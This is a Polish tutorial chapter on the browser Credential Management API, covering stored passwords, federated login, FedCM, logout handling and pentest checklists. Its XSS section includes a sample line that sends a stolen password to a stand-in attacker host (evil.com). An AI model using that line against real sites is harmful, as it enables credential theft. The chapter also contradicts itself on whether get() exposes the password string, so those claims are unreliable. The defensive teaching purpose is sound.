# Rozdział 45: Credential Management API

## 1. Czym jest Credential Management API

**Credential Management API** to interfejs przeglądarki umożliwiający stronom internetowym programatyczne interakcje z menedżerem haseł przeglądarki — przechowywanie, pobieranie i zarządzanie danymi uwierzytelniającymi bez zmuszania użytkownika do ręcznego wpisywania haseł. API ujednolica obsługę różnych typów credentials:

- **PasswordCredential** — tradycyjne hasło + login
- **FederatedCredential** — dane logowania od dostawcy tożsamości (Google, Apple, itp.)
- **PublicKeyCredential** — klucze publiczne WebAuthn/FIDO2 (omówione w rozdziale 46)

Kluczowe metody:

```javascript
// Przechowanie credentials:
navigator.credentials.store(credential)

// Pobieranie credentials:
navigator.credentials.get(options)

// Wylogowanie (zapobiega auto-fill):
navigator.credentials.preventSilentAccess()
```

API jest dostępne przez obiekt `navigator.credentials` i wymaga HTTPS (Secure Context).

---

## 2. Dlaczego powstał

### Problem: chaotyczne zarządzanie hasłami w webapps

Przed Credential Management API:

```html
<!-- Każda strona miała własne podejście do autofill: -->
<input type="password" autocomplete="current-password" name="password">
<!-- Rezultat: niespójne zachowanie między przeglądarkami, słaby UX -->

<!-- Programatyczny dostęp do stored credentials? Niemożliwe -->
<!-- Inform browser o wylogowaniu? Niemożliwe — przeglądarka mogła pokazywać "zaloguj bez hasła?" nawet po wylogowaniu -->
```

Credential Management API (W3C, Chrome 51+, Firefox za flagą, Safari 13+) daje programatyczną kontrolę nad:
1. Kiedy browser może użyć stored credentials (silent sign-in)
2. Jak informować browser o nowych lub zmienionych credentials
3. Jak zapobiec auto-fill po wylogowaniu

---

## 3. Jak działa

### Pobieranie credentials (auto sign-in)

```javascript
const credential = await navigator.credentials.get({
    password: true,                    // szukaj PasswordCredential
    federated: {
        providers: ['https://accounts.google.com']  // lub FederatedCredential
    },
    mediation: 'optional'             // 'optional' | 'required' | 'silent' | 'conditional'
});
```

### Opcja mediation

```
mediation: 'silent'
    → Nie pokazuj dialogu — zaloguj automatycznie jeśli jedna opcja
    → Jeśli preventSilentAccess() był wywołany → brak auto-sign-in
    → Idealne dla "remember me" bez interakcji

mediation: 'optional'  (domyślne)
    → Pokaż picker jeśli jest więcej opcji, lub użyj silent jeśli jedna
    → Standardowe logowanie

mediation: 'required'
    → Zawsze pokaż dialog wyboru credentials
    → Po wylogowaniu, dla switch account

mediation: 'conditional'
    → Pokazuj sugestie w polu input (autofill UI)
    → Używane z WebAuthn passkeys
```

### Przechowywanie nowych credentials

```javascript
// Po udanym logowaniu — przechowaj credentials:
const cred = new PasswordCredential({
    id: 'user@example.com',
    password: 'securePassword123',
    name: 'Jan Kowalski',            // opcjonalne
    iconURL: 'https://example.com/avatar.jpg', // opcjonalne
});

await navigator.credentials.store(cred);
// Przeglądarka może zapytać użytkownika: "Czy zapisać hasło?"
```

### FederatedCredential

```javascript
// Logowanie przez Google/Apple/GitHub:
const credential = await navigator.credentials.get({
    federated: {
        providers: ['https://accounts.google.com'],
        protocols: ['openidconnect']
    }
});

if (credential) {
    // credential.provider: 'https://accounts.google.com'
    // credential.id: 'user@gmail.com'
    // Użyj do OAuth flow
}
```

### preventSilentAccess (wylogowanie)

```javascript
// Po wylogowaniu — zapobiegaj auto-sign-in:
await navigator.credentials.preventSilentAccess();
// Przeglądarka nie będzie automatycznie logować tego użytkownika
// Przy następnym get() z mediation: 'silent' → null
```

---

## 4. Co dzieje się wewnętrznie

### Secure Context requirement

```javascript
// Credential Management API dostępne tylko na HTTPS:
if ('credentials' in navigator) {
    // HTTPS → API dostępne
} else {
    // HTTP → undefined
}

// Sprawdzenie:
window.isSecureContext; // true jeśli HTTPS lub localhost
```

### Credential Store izolacja

Credentials są przechowywane per origin (schemat + host + port). Strona `https://app.example.com` NIE ma dostępu do credentials `https://other.example.com`.

```javascript
// Każde wywołanie navigator.credentials.get() zwraca credentials
// tylko dla bieżącego origin!
```

### Same-origin policy dla credentials

```javascript
// Na https://app.example.com:
const cred = await navigator.credentials.get({ password: true });
// cred zawiera credential dla app.example.com
// NIE zawiera credentials dla api.example.com (inny origin!)
```

### Federated Identity Management (FedCM)

Nowszy standard zastępujący FederatedCredential API:

```javascript
// FedCM (Chrome 108+, zastępuje stare Federated Credential):
const cred = await navigator.credentials.get({
    identity: {
        providers: [{
            configURL: 'https://accounts.google.com/gsi/fedcm.json',
            clientId: 'YOUR_CLIENT_ID',
            nonce: 'RANDOM_NONCE'
        }]
    }
});
// Bezpieczniejszy OAuth flow bez third-party cookies
```

---

## 5. Analogiczny przykład z życia

Credential Management API to **portier i szatnia na imprezie**:

- Portier (przeglądarka) prowadzi listę zaufanych gości (stored credentials)
- Właściciel imprezy (strona) może poprosić portiera: "Kto z moich gości już jest?" (`credentials.get`)
- Po przyjęciu nowego gościa: właściciel informuje portiera aby zapamiętał (`credentials.store`)
- Gdy impreza skończona i goście wychodzą: właściciel mówi "nie wpuszczaj automatycznie następnym razem" (`preventSilentAccess`)
- Portier przechowuje listę — właściciel nigdy nie widzi samego hasła (przeglądarka to enkapsuluje)

---

## 6. Przykład kodu

```javascript
// === Kompletna implementacja Credential Management API ===

// 1. Sprawdź wsparcie:
if (!navigator.credentials) {
    console.warn('Credential Management API nie jest wspierane');
}

// 2. Auto sign-in przy załadowaniu strony:
async function attemptAutoSignIn() {
    if (!navigator.credentials) return null;
    
    try {
        const credential = await navigator.credentials.get({
            password: true,
            federated: {
                providers: ['https://accounts.google.com']
            },
            mediation: 'silent',  // brak dialogu — tylko jeśli jest jedna opcja
        });
        
        if (credential) {
            if (credential instanceof PasswordCredential) {
                // Automatyczne logowanie hasłem:
                return await loginWithPassword(credential.id, credential.password);
            }
            if (credential instanceof FederatedCredential) {
                // Automatyczne logowanie przez provider:
                return await loginWithProvider(credential.provider, credential.id);
            }
        }
    } catch (e) {
        if (e.name !== 'AbortError') {
            console.error('Auto sign-in error:', e);
        }
    }
    
    return null;
}

// 3. Logowanie z formularzem:
async function signIn(email, password) {
    const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
    });
    
    if (response.ok) {
        // Przechowaj credentials w przeglądarce:
        if (navigator.credentials) {
            const credential = new PasswordCredential({
                id: email,
                password: password,
            });
            await navigator.credentials.store(credential);
        }
        
        return await response.json();
    }
    
    throw new Error('Login failed');
}

// 4. Wylogowanie:
async function signOut() {
    await fetch('/api/logout', { method: 'POST' });
    
    // Zapobiegaj auto-sign-in:
    if (navigator.credentials) {
        await navigator.credentials.preventSilentAccess();
    }
    
    window.location.href = '/login';
}
```

```javascript
// === React hook: useCredentials ===

function useCredentials() {
    const [credential, setCredential] = useState(null);
    const [loading, setLoading] = useState(true);
    
    useEffect(() => {
        async function loadCredential() {
            if (!navigator.credentials) {
                setLoading(false);
                return;
            }
            
            try {
                const cred = await navigator.credentials.get({
                    password: true,
                    mediation: 'optional',
                });
                setCredential(cred);
            } catch (e) {
                // User cancelled or no credentials
            } finally {
                setLoading(false);
            }
        }
        
        loadCredential();
    }, []);
    
    return { credential, loading };
}
```

---

## 7. Przykład z prawdziwej aplikacji

### Phishing przez credential harvesting

Potencjalny wektor: strona phishingowa próbuje użyć Credential Management API:

```javascript
// Na phishing.com (HTTPS z certyfikatem dla phishing.com):
const cred = await navigator.credentials.get({ password: true });
// Przeglądarka zwróci credentials dla phishing.com — nie dla bank.com!
// Credentials są izolowane per origin → phishing.com dostaje tylko swoje credentials
// (jeśli user kiedyś logował się na phishing.com)

// Wniosek: Credential Management API nie umożliwia kradzieży credentials z innych origin!
```

### XSS a credential API

```javascript
// Jeśli atakujący ma XSS na legitymnej stronie:
// Może wywołać navigator.credentials.get() w kontekście tej strony!

// Atak:
// 1. XSS na bank.com
// 2. Wstrzyknięty skrypt: navigator.credentials.get({ password: true, mediation: 'silent' })
// 3. Jeśli browser ma stored credentials dla bank.com → credential.password zwrócone!
// 4. Wysyłka do atakującego: fetch('https://evil.com/steal?p=' + credential.password)

// Ochrona:
// - Silna CSP zapobiegająca wstrzykiwaniu skryptów
// - Credential jest obiektem — password zwracane przez formularze submit, nie bezpośrednio przez get()
// - UWAGA: W rzeczywistości PasswordCredential.password jest używane TYLKO do submit form
//          nie jest bezpośrednio dostępne jako string przez get() — przeglądarka przekazuje je
//          do FormData lub bezpośrednio do serwera przez formularz
```

### FedCM zamiast OAuth third-party cookies

Problem: OAuth przez third-party cookies (iframe) jest blokowane przez SameSite i Phase-out:

```javascript
// Stary OAuth przez third-party iframe:
// → Blokowane przez SameSite=None Phase-out

// FedCM (Federated Credential Management) — nowe podejście:
const cred = await navigator.credentials.get({
    identity: {
        providers: [{
            configURL: 'https://accounts.google.com/gsi/fedcm.json',
            clientId: '123456789.apps.googleusercontent.com',
            nonce: crypto.randomUUID(),
        }]
    },
    mediation: 'optional',
});

// FedCM używa browser-mediated login bez third-party cookies
// Nie ujawnia identity providera RP dopóki user nie zgodzi się
// Prywatniejsze niż stary OAuth
```

---

## 8. Typowe błędy programistów

### Błąd 1: Brak preventSilentAccess po wylogowaniu

```javascript
// BŁĄD: wylogowanie bez informowania browser:
async function logout() {
    await fetch('/api/logout', { method: 'POST' });
    window.location.href = '/login';
    // Przeglądarka nadal próbuje auto-sign-in przy następnym odwiedzeniu!
}

// POPRAWKA:
async function logout() {
    await fetch('/api/logout', { method: 'POST' });
    if (navigator.credentials) {
        await navigator.credentials.preventSilentAccess();
    }
    window.location.href = '/login';
}
```

### Błąd 2: Niepoprawna obsługa mediation

```javascript
// BŁĄD: zawsze 'required' → zły UX (zawsze pokazuje dialog)
const cred = await navigator.credentials.get({
    password: true,
    mediation: 'required', // zawsze pokaż dialog — irytujące dla returning users
});

// POPRAWKA: 'optional' dla normalnego logowania, 'required' po wylogowaniu
const isJustLoggedOut = sessionStorage.getItem('just_logged_out');
const mediation = isJustLoggedOut ? 'required' : 'optional';
const cred = await navigator.credentials.get({ password: true, mediation });
```

### Błąd 3: Przesyłanie hasła do własnego backendu

```javascript
// BŁĄD: próba wysłania credential.password przez fetch:
const cred = await navigator.credentials.get({ password: true });
// credential.password nie jest bezpośrednio dostępne!
// PasswordCredential jest przeznaczony do submitu formularzy:

// POPRAWKA: użyj formularza z PasswordCredential:
const form = document.querySelector('form#login');
form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const cred = new PasswordCredential(form);
    // Teraz wyślij przez fetch z FetchEvent:
    const response = await fetch('/api/login', {
        method: 'POST',
        credentials: 'include',
        body: cred,  // FetchEvent z credentials
    });
});
```

---

## 9. Znaczenie dla bezpieczeństwa

### Ochrona przed credential phishing

```
Credential Management API izoluje credentials per origin:
→ Phishing site nie może pobrać credentials dla legitymnej strony
→ Nawet z takim samym wyglądem (visual phishing)

Ale: jeśli user zapisał credentials na phishing site → te credentials są dostępne
Wniosek: HTTPS + poprawny domain → chrome indicator → user awareness
```

### XSS i credential exposure

```
XSS na stronie → złośliwy skrypt wywołuje navigator.credentials.get()
→ Browser MOŻE pokazać dialog credentials picker
→ Jeśli user potwierdzi → atakujący ma access do credential obiektu

Mitygacja:
1. Silna CSP (brak inline scripts, ścisłe nonces)
2. Trusted Types (zapobiegaj DOM XSS)
3. Subresource Integrity (weryfikuj third-party scripts)
```

### preventSilentAccess i session management

```javascript
// Bezpieczny logout flow:
// 1. Invalidate server session
// 2. Clear local cookies/storage
// 3. preventSilentAccess() → browser nie auto-zaloguje przy powrocie
// 4. Redirect do /login z mediation: 'required'

// Bez preventSilentAccess:
// User klika logout → wraca na stronę → auto-sign-in → pozorny logout!
```

### Powiązane CWE

- **CWE-522** — Insufficiently Protected Credentials
- **CWE-287** — Improper Authentication
- **CWE-620** — Unverified Password Change (związane z credential update flow)

---

## 10. Jak identyfikować podczas pentestu

### Sprawdź implementację

```javascript
// W konsoli na target.com:
typeof navigator.credentials; // 'object' jeśli obsługiwane
navigator.credentials.get;    // function

// Sprawdź czy strona używa Credential Management:
// Szukaj w kodzie: navigator.credentials.get/store/preventSilentAccess
```

```bash
# Wyszukaj użycia API w JavaScript:
grep -r "navigator.credentials" ./js/
grep -r "PasswordCredential\|FederatedCredential" ./js/
```

### Test logout flow

```
1. Zaloguj się do aplikacji
2. Sprawdź czy browser zaproponował zapisanie hasła
3. Wyloguj się
4. Sprawdź czy navigator.credentials.preventSilentAccess() jest wywoływane (Network tab, console)
5. Wróć na stronę — czy auto-sign-in się uruchamia?
6. Jeśli tak → brak preventSilentAccess → błąd bezpieczeństwa
```

### Test credential isolation

```javascript
// Test: czy strona podchodzi do credentials z innego origin?
// (odpowiedź zawsze: nie — ale weryfikuj że strona nie próbuje)

// W konsoli na target.com:
navigator.credentials.get({ password: true, mediation: 'silent' })
    .then(c => console.log('Got credential:', c?.id))
    .catch(e => console.log('Error:', e));
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy navigator.credentials.store() jest wywoływane po udanym logowaniu?
□ Czy navigator.credentials.preventSilentAccess() jest wywoływane po wylogowaniu?
□ Czy po wylogowaniu auto-sign-in nie następuje?
□ Czy mediation jest ustawione poprawnie (optional/required)?
□ Czy HTTPS jest używane (wymóg Credential API)?
□ Czy strona pracuje poprawnie gdy credentials API jest niedostępne (fallback)?
□ Czy XSS może wywołać credentials.get() (sprawdź CSP)?
□ Czy FedCM jest używane zamiast starych FederatedCredential (third-party cookies)?
□ Czy credential ID (email) jest weryfikowane po stronie serwera?
```

---

## 12. Jak się zabezpieczać

```javascript
// === Bezpieczna implementacja Credential Management ===

class CredentialManager {
    constructor() {
        this.supported = 'credentials' in navigator && window.isSecureContext;
    }
    
    async tryAutoSignIn() {
        if (!this.supported) return null;
        
        try {
            const credential = await navigator.credentials.get({
                password: true,
                mediation: 'silent',  // brak UI jeśli jedna opcja
            });
            return credential;
        } catch (e) {
            if (e.name !== 'AbortError') console.error('Auto sign-in error:', e);
            return null;
        }
    }
    
    async saveCredential(id, password) {
        if (!this.supported) return;
        
        try {
            const cred = new PasswordCredential({ id, password });
            await navigator.credentials.store(cred);
        } catch (e) {
            console.error('Failed to store credential:', e);
        }
    }
    
    async clearAutoSignIn() {
        if (!this.supported) return;
        await navigator.credentials.preventSilentAccess();
    }
}

// Użycie:
const credManager = new CredentialManager();

// Przy logowaniu:
const loginResult = await performLogin(email, password);
if (loginResult.success) {
    await credManager.saveCredential(email, password);
}

// Przy wylogowaniu:
await performLogout();
await credManager.clearAutoSignIn();
```

---

## 13. Podsumowanie

**Kluczowe fakty:**

1. Credential Management API = `navigator.credentials.get/store/preventSilentAccess()`
2. Typy: `PasswordCredential`, `FederatedCredential`, `PublicKeyCredential` (WebAuthn)
3. Credentials izolowane per origin — phishing.com nie dostaje credentials bank.com
4. `preventSilentAccess()` musi być wywoływane przy wylogowaniu — inaczej auto-sign-in nadal działa
5. FedCM zastępuje stare FederatedCredential jako prywatniejszy OAuth bez third-party cookies

**Dla pentestera:**
- Sprawdź czy `preventSilentAccess()` jest wywoływane przy wylogowaniu
- Testuj auto-sign-in po wylogowaniu — jeśli działa → brak preventSilentAccess
- Sprawdź XSS → czy może wywołać `credentials.get()` bez interakcji użytkownika
- Brak HTTPS → Credential Management API niedostępne → sprawdź czy fallback jest bezpieczny

---

## Powiązania

```
Credential Management API
    │
    ├──► WebAuthn / Passkeys (Rozdział 46)
    │         PublicKeyCredential jest obsługiwany przez Credential API
    │         Passkeys = WebAuthn przez Credential Management
    │
    ├──► Cookies (Rozdział 14)
    │         Session cookies po stronie serwera
    │         Credential API: client-side credential management
    │
    ├──► CHIPS / Storage Access API (Rozdziały 41, 47)
    │         FedCM alternatywa dla third-party auth cookies
    │
    └──► CSP / Trusted Types (Rozdziały 36, 37)
              XSS może nadużyć Credential API
              CSP chroni przed unauthorized script execution
```
